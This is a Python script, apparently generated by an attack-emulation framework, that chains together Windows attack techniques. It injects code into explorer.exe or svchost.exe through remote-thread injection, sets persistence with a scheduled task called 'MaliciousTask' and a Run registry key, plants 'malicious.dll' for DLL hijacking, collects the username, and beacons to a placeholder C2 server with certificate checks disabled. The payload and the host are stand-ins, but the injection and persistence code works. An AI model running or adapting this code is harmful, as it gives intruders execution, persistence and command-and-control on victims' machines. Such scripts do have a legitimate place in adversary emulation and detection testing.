#!/usr/bin/env python3
import sys, json, time, subprocess, os, shutil, ctypes, psutil
from ctypes import wintypes
from typing import Dict, Any
import requests
import ssl

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF

# Define necessary Windows API functions
kernel32 = ctypes.windll.kernel32
VirtualAllocEx = kernel32.VirtualAllocEx
WriteProcessMemory = kernel32.WriteProcessMemory
CreateRemoteThread = kernel32.CreateRemoteThread
OpenProcess = kernel32.OpenProcess
GetLastError = kernel32.GetLastError

# Define types for Windows API functions
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
CreateRemoteThread.restype = wintypes.HANDLE

OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'remote_addr': None, 'success': False}
    try:
        # Step 1: Find target process
        target_pid = None
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in ('explorer.exe', 'notepad.exe', 'svchost.exe'):
                target_pid = proc.info['pid']
                break
        
        # Fallback to self-injection if no target process found
        injection_success = True
        if target_pid is None:
            target_pid = kernel32.GetCurrentProcess()
            injection_success = False

        # Step 2: Open target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not process_handle:
            raise Exception(f"Failed to open process: {GetLastError()}")

        # Shellcode to inject (example: NOP sled)
        shellcode = b"\x90" * 100

        # Step 3: Allocate memory in the target process
        remote_addr = VirtualAllocEx(process_handle, None, len(shellcode), 0x3000, 0x40)
        if not remote_addr:
            raise Exception(f"VirtualAllocEx failed: {GetLastError()}")

        # Step 4: Write shellcode into the allocated memory
        written = ctypes.c_size_t(0)
        if not WriteProcessMemory(process_handle, remote_addr, shellcode, len(shellcode), ctypes.byref(written)):
            raise Exception(f"WriteProcessMemory failed: {GetLastError()}")

        # Step 5: Create a remote thread to execute the shellcode
        if not CreateRemoteThread(process_handle, None, 0, remote_addr, None, 0, None):
            raise Exception(f"CreateRemoteThread failed: {GetLastError()}")

        # If all steps succeed
        result['remote_addr'] = remote_addr
        result['success'] = injection_success

    except Exception as e:
        # Log error and return partial result
        result['error'] = f'{type(e).__name__}: {e}'
    finally:
        return {'success': result['success'], 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time() - start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    task_created = False
    try:
        # Define the task name and executable path
        task_name = "MaliciousTask"
        exe_path = sys.executable if sys.executable else os.path.abspath(sys.argv[0])

        # Create a scheduled task to run on logon
        schtasks_result = subprocess.run(
            ['schtasks', '/create', '/tn', task_name, '/tr', exe_path, '/sc', 'onlogon', '/f'],
            capture_output=True, text=True
        )

        # Check if the scheduled task was created successfully
        if schtasks_result.returncode == 0:
            task_created = True
        else:
            # Log failure
            print(f"Failed to create scheduled task: {schtasks_result.stderr}")

        # Attempt to register the executable in the Windows registry for persistence
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, exe_path)
                # Verify registration
                registered_exe_path, _ = winreg.QueryValueEx(key, task_name)
                if registered_exe_path == exe_path:
                    task_created = True
        except Exception as reg_error:
            # Log registry failure
            print(f"Failed to register in registry: {reg_error}")

        result = {'task_created': task_created}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    target_dir = "C:\\Users\\Public\\"
    dll_name = "malicious.dll"
    source_dll_path = os.path.join(os.getcwd(), dll_name)  # Assuming the DLL is in the current working directory

    try:
        # Attempt to copy the malicious DLL to the target directory
        shutil.copy(source_dll_path, target_dir)
        dll_loaded = os.path.exists(os.path.join(target_dir, dll_name))
        result = {'dll_loaded': dll_loaded}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # If copying fails, log the error and return dll_loaded as False
        result = {'dll_loaded': False}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Attempt to get the username using environment variables
        username = os.getenv('USERNAME') or os.getenv('USER')
        
        # If environment variables fail, try using pywin32 if available
        if not username:
            try:
                import win32api
                username = win32api.GetUserName()
            except ImportError:
                username = None
        
        # Prepare the result dictionary
        result = {'username': username}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'connected': False}
    c2_url = "https://c2server.example.com"  # Replace with actual C2 server URL

    try:
        # Create an SSL context for HTTPS communication
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Attempt to connect to the C2 server using HTTPS
        try:
            response = requests.get(c2_url, timeout=10, verify=False)
            if response.status_code == 200:
                result['connected'] = True
        except requests.exceptions.SSLError:
            # Fallback to HTTP if HTTPS fails
            c2_url_http = c2_url.replace("https://", "http://")
            response = requests.get(c2_url_http, timeout=10)
            if response.status_code == 200:
                result['connected'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Inject shellcode into a running process [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Inject shellcode into a running process): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Inject shellcode into a running process): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Establish persistence with a scheduled task [persistence] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Establish persistence with a scheduled task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Establish persistence with a scheduled task): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Load malicious code through DLL hijacking [persistence] ──
    try:
        r = task_T3(None)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Load malicious code through DLL hijacking): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Load malicious code through DLL hijacking): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Identify the current user [discovery] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Identify the current user): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Identify the current user): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T5: Communicate with a C2 server over HTTPS [c2-setup] ──
    try:
        r = task_T5(None)
        results['T5'] = r
        if r.get('success'):
            outputs['T5'] = r.get('data', {})
            print(f'[+] T5 (Communicate with a C2 server over HTTPS): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T5 (Communicate with a C2 server over HTTPS): FAILED — {err}')
            failed.append('T5')
            r2 = task_T5(None)
            if r2.get('success'):
                outputs['T5'] = r2.get('data', {})
                failed.remove('T5')
    except Exception as e:
        print(f'[!] T5 crashed: {e}')
        failed.append('T5')
        results['T5'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))